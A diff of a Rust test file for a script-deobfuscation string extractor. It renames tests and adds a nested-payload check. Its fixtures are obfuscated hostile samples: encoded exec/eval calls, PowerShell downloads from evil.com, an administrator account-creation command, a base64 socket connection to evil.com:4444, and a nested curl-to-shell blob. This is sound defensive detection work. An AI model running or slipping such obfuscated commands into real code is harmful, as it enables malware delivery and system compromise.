@@ -11,7 +11,7 @@ use stng::{ExtractOptions, StringKind, StringMethod};
 // ============================================================================
 
 #[test]
-fn test_python_exec_b64decode() {
+fn decodes_python_exec_b64decode() {
     // exec(base64.b64decode("...")) — the simplest Python obfuscation
     let src = br#"#!/usr/bin/env python3
 import base64
@@ -42,7 +42,7 @@ exec(base64.b64decode("cHJpbnQoJ2hlbGxvIGZyb20gbWFsd2FyZScp"))
 }
 
 #[test]
-fn test_python_exec_zlib_b64() {
+fn decodes_python_zlib_base64() {
     // exec(zlib.decompress(base64.b64decode("...")))
     use flate2::Compression;
     use flate2::write::ZlibEncoder;
@@ -77,7 +77,7 @@ exec(zlib.decompress(base64.b64decode("{encoded}")))
 }
 
 #[test]
-fn test_python_exec_zlib_b64_xor() {
+fn decodes_python_zlib_base64_xor() {
     // The full tahmin-uygulamasi pattern: base64 → zlib → XOR
     use flate2::Compression;
     use flate2::write::ZlibEncoder;
@@ -122,7 +122,7 @@ exec(compile(result, '<>', 'exec'))
 }
 
 #[test]
-fn test_python_exec_fromhex() {
+fn decodes_python_bytes_fromhex() {
     let src = br#"import sys
 exec(bytes.fromhex("696d706f7274206f733b206f732e73797374656d2827776861616d6927290a"))
 "#;
@@ -140,7 +140,7 @@ exec(bytes.fromhex("696d706f7274206f733b206f732e73797374656d2827776861616d692729
 }
 
 #[test]
-fn test_python_chr_array() {
+fn decodes_python_chr_array() {
     // exec("".join(chr(x) for x in [...])) — character code array
     let src = br#"import os
 exec("".join(chr(x) for x in [105, 109, 112, 111, 114, 116, 32, 115, 121, 115]))
@@ -164,7 +164,7 @@ exec("".join(chr(x) for x in [105, 109, 112, 111, 114, 116, 32, 115, 121, 115]))
 }
 
 #[test]
-fn test_python_codecs_rot13() {
+fn decodes_python_codecs_rot13() {
     let src = br#"import codecs
 exec(codecs.decode("vzcbeg bf; bf.flfgrz('jubnzv')", "rot_13"))
 "#;
@@ -187,7 +187,7 @@ exec(codecs.decode("vzcbeg bf; bf.flfgrz('jubnzv')", "rot_13"))
 }
 
 #[test]
-fn test_python_no_false_positive() {
+fn ignores_legitimate_python_base64() {
     // Legitimate Python with base64 usage should NOT trigger deobfuscation
     let src = br#"import base64
 import json
@@ -221,7 +221,7 @@ print(decoded)
 // ============================================================================
 
 #[test]
-fn test_javascript_eval_atob() {
+fn decodes_js_eval_atob() {
     let src = br#"const http = require('http');
 eval(atob("Y29uc29sZS5sb2coJ3B3bmVkJyk="))
 "#;
@@ -239,7 +239,7 @@ eval(atob("Y29uc29sZS5sb2coJ3B3bmVkJyk="))
 }
 
 #[test]
-fn test_javascript_eval_buffer_from() {
+fn decodes_js_buffer_from_base64() {
     let payload = "require('child_process').exec('whoami')";
     let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
     let src = format!(
@@ -260,7 +260,7 @@ eval(Buffer.from("{encoded}", "base64").toString())
 }
 
 #[test]
-fn test_javascript_string_fromcharcode() {
+fn decodes_js_string_fromcharcode() {
     // eval(String.fromCharCode(...)) — hex char codes for "alert(1)"
     let src = br"var x = 1;
 eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))
@@ -279,7 +279,7 @@ eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))
 }
 
 #[test]
-fn test_javascript_eval_reverse() {
+fn decodes_js_reversed_string() {
     let src = br#"function x() {}
 eval(")1(trela".split("").reverse().join(""))
 "#;
@@ -301,7 +301,7 @@ eval(")1(trela".split("").reverse().join(""))
 // ============================================================================
 
 #[test]
-fn test_php_eval_base64_decode() {
+fn decodes_php_base64_decode() {
     let payload = "system('id');";
     let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
     let src = format!(r#"<?php eval(base64_decode("{encoded}")); ?>"#);
@@ -318,7 +318,7 @@ fn test_php_eval_base64_decode() {
 }
 
 #[test]
-fn test_php_eval_gzinflate_base64() {
+fn decodes_php_gzinflate_base64() {
     use flate2::Compression;
     use flate2::write::DeflateEncoder;
     use std::io::Write;
@@ -343,7 +343,7 @@ fn test_php_eval_gzinflate_base64() {
 }
 
 #[test]
-fn test_php_eval_str_rot13() {
+fn decodes_php_str_rot13() {
     let src = br#"<?php eval(str_rot13("flfgrz('jubnzv');")); ?>"#;
     // ROT13 of: system('whoami');
 
@@ -368,7 +368,7 @@ fn powershell_encode_command(cmd: &str) -> String {
 }
 
 #[test]
-fn test_powershell_encoded_command() {
+fn decodes_powershell_encodedcommand() {
     let encoded =
         powershell_encode_command("Invoke-WebRequest -Uri 'https://evil.com/payload.exe'");
     let src = format!("powershell.exe -EncodedCommand {encoded}\n");
@@ -390,7 +390,7 @@ fn test_powershell_encoded_command() {
 }
 
 #[test]
-fn test_powershell_encoded_command_short_flag() {
+fn decodes_powershell_enc_flag() {
     let encoded = powershell_encode_command("Write-Host 'compromised'");
     let src = format!("powershell -enc {encoded}\n");
 
@@ -406,7 +406,7 @@ fn test_powershell_encoded_command_short_flag() {
 }
 
 #[test]
-fn test_powershell_convert_from_base64() {
+fn decodes_powershell_frombase64string() {
     let encoded = powershell_encode_command("Get-Process | Stop-Process");
     let src = format!(
         r#"$bytes = [Convert]::FromBase64String("{encoded}")
@@ -438,7 +438,7 @@ fn b64_utf16le(s: &str) -> String {
 }
 
 #[test]
-fn test_bare_base64_utf16le_in_plain_text() {
+fn decodes_bare_utf16le_base64_in_text() {
     // A wide-encoded payload sitting in an ordinary config/text file with no
     // PowerShell marker around it. It must still decode via the generic path.
     let blob = b64_utf16le("Invoke-WebRequest http://evil.com/x.exe");
@@ -457,7 +457,7 @@ fn test_bare_base64_utf16le_in_plain_text() {
 }
 
 #[test]
-fn test_decode_encoded_strings_surfaces_wide_payload() {
+fn decode_encoded_strings_recovers_utf16le_payload() {
     // Exercises the public helper the CLI text path relies on: given a raw
     // string that is itself a wide-encoded base64 blob, it must recover the text.
     let blob = b64_utf16le("net user administrator P@ssw0rd /add");
@@ -476,7 +476,7 @@ fn test_decode_encoded_strings_surfaces_wide_payload() {
 }
 
 #[test]
-fn test_powershell_char_array() {
+fn decodes_powershell_char_array() {
     // iex([char[]](87,104,111,97,109,105) -join '')  → "Whoami"
     let src = r#"$x = 1
 Invoke-Expression "test"
@@ -495,7 +495,7 @@ iex([char[]](87,104,111,97,109,105) -join '')
 }
 
 #[test]
-fn test_powershell_replace_obfuscation() {
+fn decodes_powershell_replace() {
     let src = r#"Invoke-Expression "test"
 iex("hXXps://evil.com/payload.exe".replace("XX","tt"))
 "#;
@@ -517,7 +517,7 @@ iex("hXXps://evil.com/payload.exe".replace("XX","tt"))
 // ============================================================================
 
 #[test]
-fn test_mixed_legitimate_and_obfuscated() {
+fn finds_plain_and_decoded_strings_together() {
     // A file with both legitimate Python code and an obfuscated payload
     // (like the tahmin-uygulamasi sample)
     let src = br#"#!/usr/bin/env python3
@@ -554,7 +554,7 @@ exec(base64.b64decode("aW1wb3J0IHNvY2tldDsgcy5jb25uZWN0KCgnZXZpbC5jb20nLCA0NDQ0K
 }
 
 #[test]
-fn test_json_output_includes_script_decode() {
+fn serializes_script_decode_method() {
     let src = br#"import base64
 exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
 "#;
@@ -578,7 +578,7 @@ exec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))
 }
 
 #[test]
-fn test_classification_of_decoded_content() {
+fn classifies_decoded_url_as_url() {
     // The decoded payload should be classified by the IOC classifier
     let payload = "https://evil.com/payload.exe";
     let encoded = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
@@ -588,13 +588,12 @@ fn test_classification_of_decoded_content() {
     let strings = stng::extract_strings_with_options(src.as_bytes(), &opts);
 
     // The decoded URL should be classified as a URL
-    let url_strings: Vec<_> = strings
-        .iter()
-        .filter(|s| s.method == StringMethod::ScriptDecode && s.kind == Some(StringKind::Url))
-        .collect();
-
     assert!(
-        !url_strings.is_empty(),
+        strings
+            .iter()
+            .any(|s| s.method == StringMethod::ScriptDecode
+                && s.kind == Some(StringKind::Url)
+                && s.value == payload),
         "Decoded URL should be classified as StringKind::Url. ScriptDecode strings: {:?}",
         strings
             .iter()
@@ -609,7 +608,7 @@ fn test_classification_of_decoded_content() {
 // ============================================================================
 
 #[test]
-fn test_detect_language_python() {
+fn detect_language_reports_python_as_text() {
     let src = b"#!/usr/bin/env python3\nimport os\ndef main():\n    pass\n";
     assert_eq!(stng::detect_language(src), stng::Language::Text);
     // Note: detect_language returns "text" for scripts since the current API
@@ -617,7 +616,7 @@ fn test_detect_language_python() {
 }
 
 #[test]
-fn test_binary_files_not_affected() {
+fn skips_script_decoding_in_elf() {
     // ELF magic should not trigger script deobfuscation
     let elf_like = b"\x7fELF\x00\x00\x00\x00exec(base64.b64decode('dGVzdA=='))";
 
@@ -654,4 +653,16 @@ fn vbscript_encode_in_asp_is_deobfuscated_as_text_and_inside_binary() {
             "encoded VBScript payload should be exposed as decoded strings"
         );
     }
+}
+
+#[test]
+fn nested_payloads_are_located_at_the_outer_blob() {
+    let src = "import base64\n# padding line to move the blob\nexec(base64.b64decode('ZXhlYyhiYXNlNjQuYjY0ZGVjb2RlKCdhVzF3YjNKMElHOXpDbTl6TG5ONWMzUmxiU2duWTNWeWJDQm9kSFJ3T2k4dmJtVnpkR1ZrTG1WNFlXMXdiR1V2ZUNCOElITm9KeWtLJykpCg=='))\n";
+    let outer = src.find("exec(").unwrap();
+    let results = stng::script::deobfuscate_script(src.as_bytes());
+    let inner = results
+        .iter()
+        .find(|r| r.decoded.contains("nested.example"))
+        .expect("the inner payload is decoded");
+    assert_eq!(inner.offset, outer, "{results:?}");
 }
